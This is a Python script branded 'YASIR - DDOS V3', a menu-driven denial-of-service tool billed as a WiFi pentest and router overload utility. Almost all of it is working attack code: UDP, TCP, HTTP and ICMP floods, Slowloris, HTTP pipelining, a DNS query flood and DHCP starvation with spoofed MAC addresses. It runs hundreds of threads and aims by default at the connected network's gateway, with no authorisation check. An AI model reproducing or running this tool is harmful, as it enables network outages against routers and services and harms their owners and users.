#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                    🔥 YASIR - DDOS V3 🔥                   ║
║           Ultimate WiFi Pentest & Router Overload          ║
║                  Author: YASIR | v3.0                     ║
╚══════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import time
import sys
import random
import os
import subprocess
from datetime import datetime

# Colors for Termux
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Global variables
stop_attack = False
packets_sent = 0
active_connections = 0
start_time = 0
target_ip = ""
target_ports = [80, 443, 8080, 22, 53, 23, 67, 68]
thread_count = 500

def clear_screen():
    os.system('clear')

def get_current_wifi_ip():
    """Current WiFi se gateway nikalta hai"""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'default via' in line:
                parts = line.split()
                return parts[2]
    except:
        pass
    return "192.168.100.1"

def show_banner():
    """Banner dikhata hai"""
    clear_screen()
    
    banner = f"""
{PURPLE}{BOLD}████████████████████████████████████████████████████████████████{RESET}
{PURPLE}{BOLD}██                                                        ██{RESET}
{PURPLE}{BOLD}██   ██╗   ██╗ █████╗ ███████╗██╗██████╗  ██████╗ ██╗   ██╗██████╗  ██{RESET}
{PURPLE}{BOLD}██   ╚██╗ ██╔╝██╔══██╗██╔════╝██║██╔══██╗██╔═══██╗██║   ██║██╔══██╗ ██{RESET}
{PURPLE}{BOLD}██    ╚████╔╝ ███████║███████╗██║██████╔╝██║   ██║██║   ██║██████╔╝ ██{RESET}
{PURPLE}{BOLD}██     ╚██╔╝  ██╔══██║╚════██║██║██╔══██╗██║   ██║██║   ██║██╔══██╗ ██{RESET}
{PURPLE}{BOLD}██      ██║   ██║  ██║███████║██║██║  ██║╚██████╔╝╚██████╔╝██║  ██║ ██{RESET}
{PURPLE}{BOLD}██      ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ██{RESET}
{PURPLE}{BOLD}██                                                        ██{RESET}
{PURPLE}{BOLD}████████████████████████████████████████████████████████████████{RESET}
    
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗{RESET}
{CYAN}{BOLD}║{RESET}  {YELLOW}🔥 ULTIMATE WIFI PENTEST TOOL 🔥                    {RESET}
{CYAN}{BOLD}║{RESET}  {WHITE}Version: 3.0 | Author: {GREEN}YASIR{WHITE}                   {RESET}
{CYAN}{BOLD}║{RESET}  {WHITE}Target IP: {RED}{target_ip if target_ip else 'NOT SET'}{WHITE}           {RESET}
{CYAN}{BOLD}║{RESET}  {WHITE}Gateway: {BLUE}{get_current_wifi_ip()}{WHITE}                     {RESET}
{CYAN}{BOLD}║{RESET}  {WHITE}Threads: {RED}{thread_count}{WHITE}                              {RESET}
{CYAN}{BOLD}║{RESET}  {WHITE}Date: {BLUE}{datetime.now().strftime('%H:%M:%S')}{WHITE}                   {RESET}
{CYAN}{BOLD}╚══════════════════════════════════════════════════════════════╝{RESET}
    """
    print(banner)

# ===================== ATTACK METHODS =====================

def udp_flood():
    global packets_sent, stop_attack
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65507)
    while not stop_attack:
        try:
            port = random.choice(target_ports)
            s.sendto(data, (target_ip, port))
            packets_sent += 1
        except:
            pass

def tcp_syn_flood():
    global packets_sent, active_connections, stop_attack
    while not stop_attack:
        try:
            port = random.choice(target_ports)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            active_connections += 1
            if random.randint(1,100) > 60:
                time.sleep(random.uniform(1, 3))
            s.close()
            packets_sent += 1
            active_connections -= 1
        except:
            active_connections -= 1
            pass

def http_flood():
    global packets_sent, stop_attack
    payloads = [
        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
        f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 100000\r\n\r\n{'A'*100000}",
        f"POST /cgi-bin/login HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 50000\r\n\r\n{'B'*50000}",
        f"GET /setup.cgi HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
        f"POST /goform/ HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 99999\r\n\r\n{'C'*99999}",
    ]
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, 80))
            s.send(random.choice(payloads).encode())
            s.settimeout(0.1)
            try:
                while True:
                    data = s.recv(1024)
                    if not data:
                        break
            except:
                pass
            s.close()
            packets_sent += 1
        except:
            pass

def slow_loris():
    global packets_sent, active_connections, stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target_ip, 80))
            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            active_connections += 1
            for _ in range(1000):
                if stop_attack:
                    break
                try:
                    s.send(f"X-Header: {random._urandom(50).hex()}\r\n".encode())
                    time.sleep(5)
                    packets_sent += 1
                except:
                    break
            s.close()
            active_connections -= 1
        except:
            active_connections -= 1
            pass

def dns_amplification():
    global packets_sent, stop_attack
    dns_query = b'\x00\x20\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_attack:
        try:
            s.sendto(dns_query, (target_ip, 53))
            packets_sent += 1
        except:
            pass

def dhcp_starvation():
    global packets_sent, stop_attack
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    while not stop_attack:
        try:
            fake_mac = "02:11:22:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(3))
            dhcp_packet = b'\x01\x01\x06\x00' + b'\x00' * 44 + bytes.fromhex(fake_mac.replace(':', '')) + b'\x00' * 202 + b'\x63\x82\x53\x63\x35\x01\x01\xff'
            s.sendto(dhcp_packet, (target_ip, 67))
            packets_sent += 1
        except:
            pass

def icmp_flood():
    global packets_sent, stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65500)
            s.sendto(packet, (target_ip, 1))
            packets_sent += 100
            s.close()
        except:
            try:
                os.system(f"ping -c 1 -s 65500 {target_ip} > /dev/null 2>&1 &")
                packets_sent += 50
            except:
                pass

def http_pipelining():
    global packets_sent, stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, 80))
            pipeline = ""
            for _ in range(100):
                pipeline += f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(pipeline.encode())
            time.sleep(3)
            s.close()
            packets_sent += 100
        except:
            pass

# ===================== STATS DISPLAY =====================

def show_stats():
    global packets_sent, active_connections, stop_attack, start_time
    while not stop_attack:
        elapsed = int(time.time() - start_time) if start_time > 0 else 0
        rate = packets_sent / (elapsed + 0.001)
        
        if rate < 1000:
            speed_color = GREEN
        elif rate < 10000:
            speed_color = YELLOW
        else:
            speed_color = RED
        
        print(f"\033[15;0H", end="")
        print(f"{WHITE}{BOLD}┌─────────────────────────────────────────────────────────────┐{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  {BOLD}🔥 YASIR - REAL-TIME STATS{' ' * 27}{RESET}")
        print(f"{WHITE}{BOLD}├─────────────────────────────────────────────────────────────┤{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  🎯 Target     : {RED}{target_ip}{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  📦 Packets    : {speed_color}{packets_sent:,}{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  ⚡ Speed      : {speed_color}{rate:,.0f} pkts/sec{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  🔗 Active Conns: {YELLOW}{active_connections}{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  ⏱ Time       : {CYAN}{elapsed}s{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  🧵 Threads    : {PURPLE}{thread_count}{RESET}")
        
        if packets_sent > 1000:
            status = f"{GREEN}🔥 ATTACK RUNNING 🔥{RESET}"
        else:
            status = f"{YELLOW}⏳ STARTING...{RESET}"
        print(f"{WHITE}{BOLD}│{RESET}  {status}")
        print(f"{WHITE}{BOLD}├─────────────────────────────────────────────────────────────┤{RESET}")
        print(f"{WHITE}{BOLD}│{RESET}  {RED}Ctrl+C{RESET} to stop")
        print(f"{WHITE}{BOLD}└─────────────────────────────────────────────────────────────┘{RESET}")
        time.sleep(0.5)

# ===================== START ATTACK =====================

def start_attack(methods):
    global stop_attack, start_time, packets_sent, active_connections
    
    stop_attack = False
    packets_sent = 0
    active_connections = 0
    start_time = time.time()
    
    clear_screen()
    print(f"\n{GREEN}{BOLD}🔥 YASIR DDOS - ATTACK STARTED 🔥{RESET}")
    print(f"{WHITE}Target: {RED}{target_ip}{RESET}")
    print(f"{WHITE}Threads: {RED}{thread_count}{RESET}")
    print(f"{WHITE}Methods: {CYAN}{len(methods)}{RESET}\n")
    
    # Stats thread
    threading.Thread(target=show_stats, daemon=True).start()
    
    # Attack threads
    per_method = thread_count // len(methods)
    for method in methods:
        for _ in range(per_method):
            threading.Thread(target=method, daemon=True).start()
    
    remaining = thread_count - (per_method * len(methods))
    for _ in range(remaining):
        threading.Thread(target=methods[0], daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_attack = True
        elapsed = int(time.time() - start_time)
        print(f"\n\n{RED}[!] Stopped by user{RESET}")
        print(f"{GREEN}[✓] Total: {packets_sent:,} packets in {elapsed}s{RESET}")
        print(f"{GREEN}[✓] Speed: {packets_sent/(elapsed+0.001):,.0f} pkts/sec{RESET}")
        input(f"\n{BLUE}Enter press karo...{RESET}")

# ===================== MAIN MENU =====================

def main():
    global target_ip, target_ports, thread_count
    
    # Default target connected WiFi ka gateway
    target_ip = get_current_wifi_ip()
    
    while True:
        show_banner()
        
        print(f"""
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{WHITE}{BOLD}  📋 YASIR MAIN MENU{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}

{GREEN}[1]{RESET} 🎯 Set Target Manual
{GREEN}[2]{RESET} 📡 Auto-Detect (Current WiFi)
{GREEN}[3]{RESET} 🚀 Start Attack (All Methods)
{GREEN}[4]{RESET} ⚡ HTTP Flood Only
{GREEN}[5]{RESET} ⚡ UDP + TCP Flood
{GREEN}[6]{RESET} ⚡ Slowloris + DNS + DHCP
{GREEN}[7]{RESET} 🧵 Thread Count Change
{GREEN}[8]{RESET} 🔌 Ports Change
{GREEN}[0]{RESET} ❌ Exit

{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{BLUE}Current: {RED}{target_ip}{BLUE} | Threads: {RED}{thread_count}{BLUE} | Ports: {RED}{len(target_ports)}{RESET}
{WHITE}{BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
        """)
        
        choice = input(f"{CYAN}{BOLD}YASIR>{RESET} ").strip()
        
        if choice == "1":
            ip = input(f"Target IP: ").strip()
            if ip:
                target_ip = ip
                print(f"{GREEN}✓ Target: {target_ip}{RESET}")
                time.sleep(1)
        
        elif choice == "2":
            gw = get_current_wifi_ip()
            target_ip = gw
            print(f"{GREEN}✓ Auto-detected gateway: {target_ip}{RESET}")
            time.sleep(1)
        
        elif choice == "3":
            if not target_ip:
                print(f"{RED}Pehle target set karo!{RESET}")
                time.sleep(1)
                continue
            methods = [udp_flood, tcp_syn_flood, http_flood, slow_loris, dns_amplification, dhcp_starvation, icmp_flood, http_pipelining]
            start_attack(methods)
        
        elif choice == "4":
            if not target_ip:
                print(f"{RED}Pehle target set karo!{RESET}")
                time.sleep(1)
                continue
            start_attack([http_flood, http_pipelining])
        
        elif choice == "5":
            if not target_ip:
                print(f"{RED}Pehle target set karo!{RESET}")
                time.sleep(1)
                continue
            start_attack([udp_flood, tcp_syn_flood, icmp_flood])
        
        elif choice == "6":
            if not target_ip:
                print(f"{RED}Pehle target set karo!{RESET}")
                time.sleep(1)
                continue
            start_attack([slow_loris, dns_amplification, dhcp_starvation])
        
        elif choice == "7":
            t = input(f"Threads (current: {thread_count}): ").strip()
            if t.isdigit() and int(t) > 0:
                thread_count = int(t)
                print(f"{GREEN}✓ Threads: {thread_count}{RESET}")
            time.sleep(1)
        
        elif choice == "8":
            p = input(f"Ports (comma, default 80,443,8080,22,53): ").strip()
            if p:
                try:
                    target_ports = [int(x.strip()) for x in p.split(",")]
                    print(f"{GREEN}✓ Ports: {target_ports}{RESET}")
                except:
                    print(f"{RED}Invalid ports{RESET}")
            time.sleep(1)
        
        elif choice == "0":
            print(f"\n{RED}Exiting YASIR...{RESET}")
            print(f"{GREEN}Happy Hacking!{RESET}")
            sys.exit(0)
        
        else:
            print(f"{RED}Invalid{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting...{RESET}")
        sys.exit(0)
